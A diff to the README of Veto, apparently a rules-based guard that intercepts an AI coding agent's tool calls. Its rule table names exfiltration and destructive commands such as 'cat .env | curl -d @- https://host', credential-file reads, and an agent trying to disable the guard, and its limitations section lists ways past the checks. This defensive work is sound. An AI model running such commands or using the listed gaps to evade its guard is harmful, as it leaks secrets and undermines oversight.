@@ -6,8 +6,8 @@ Veto is a safety layer for AI coding agents, starting with [Claude Code](https:/
 every tool call Claude Code makes, checks it against a set of rules, and — in guard mode — blocks the dangerous ones
 before they run. It runs 100% on your machine: no network, no telemetry.
 
-<!-- TODO: demo GIF here (veto init --guard, then Claude trying `git reset --hard` and getting blocked). -->
-_Demo GIF coming soon._
+<!-- VHS tape available at scripts/demo.tape. Run `npm run demo` for the interactive terminal demo. -->
+_Run `npm run demo` for a live interactive walkthrough of Veto intercepting destructive agent commands._
 
 > **Status: early preview (v0.1).** Veto is rules-based today — it matches known command shapes and file paths. A
 > model-based reviewer that judges intent is planned. Expect gaps; see [What Veto does not cover](#what-veto-does-not-cover).
@@ -37,8 +37,8 @@ medium asks you, low is logged.
 | **Destructive** | work-discarding git (`reset --hard`, `checkout -- .`, `clean -dx`), force pushes, branch deletes, `git stash drop`, recursive `rm`/`chmod`/`chown` and `find -delete` outside the project, moves/writes outside the project, `dd`, `mkfs` | `git reset --hard` with uncommitted changes → **deny** |
 | **File tools** | Read/Write/Edit of secret-looking paths: `.env`, `*.pem`, `*.key`, SSH keys, `~/.ssh`, `~/.aws/credentials`, `~/.npmrc`, `~/.netrc`, `*credentials*.json` | `Edit .env` → **ask** |
 | **Secret access** | shell reads of those same files, and full environment dumps | `cat .env`, `git show HEAD:.env` → **ask**; `printenv` → **log** |
-| **Exfiltration** | network clients sending local data: `curl`/`wget`/HTTPie with a body or upload, `nc`/`socat` reading piped input, `scp`/`rsync`/`sftp` to a remote host | `curl -d @dump.json https://host` → **ask** |
-| **Self-protection** | the agent trying to turn Veto off: `veto allow`, `veto mode watch`, `veto uninstall`, or writing into `.veto/` | agent runs `veto allow` → **deny** |
+| **Exfiltration** | network clients sending local data (`curl -d`, `wget`, `nc` piped input, `scp`/`rsync`/`sftp`), and transmitting secrets off-machine (`cat .env \| curl`, `curl -d @.env`, `scp .env host:`) | `cat .env \| curl -d @- https://host` → **deny**; `curl -d @dump.json https://host` → **ask** |
+| **Self-protection** | the agent trying to turn Veto off: `veto allow`, `veto mode watch`, `veto uninstall`, or modifying `.veto/` and `.claude/settings*.json` | agent runs `veto allow` → **deny** |
 
 Veto reads the order of commands within a single line, so `git stash && git reset --hard` is low (your changes are
 stashed first) while a bare `git reset --hard` is high. A plain GET, a `git show --stat`, reading `.env.example`, and
@@ -89,8 +89,6 @@ and the reason tells you to run it yourself if you agree.
 - **Secrets outside the list, or behind a variable.** Secret checks go by file path and known command shapes, not file
   contents. A path in a variable, glob or `$(...)` (`cat $F`, `cat *.pem`), or a script that opens `.env` itself, isn't
   caught.
-- **A secret flowing into a network command** (e.g. `cat .env | curl -d @- https://…`) is flagged as a medium "ask",
-  not yet the high "deny" it deserves — Veto flags the read and the send on their own but doesn't yet connect them.
 - **Sending to localhost.** In v0.1 a request to `localhost` / `127.0.0.1` is flagged like any other host, even though
   it usually stays on your machine.
 - **Network clients outside the common set.** The check knows `curl`, `wget`, HTTPie, `nc`/`ncat`, `socat`, `telnet`,
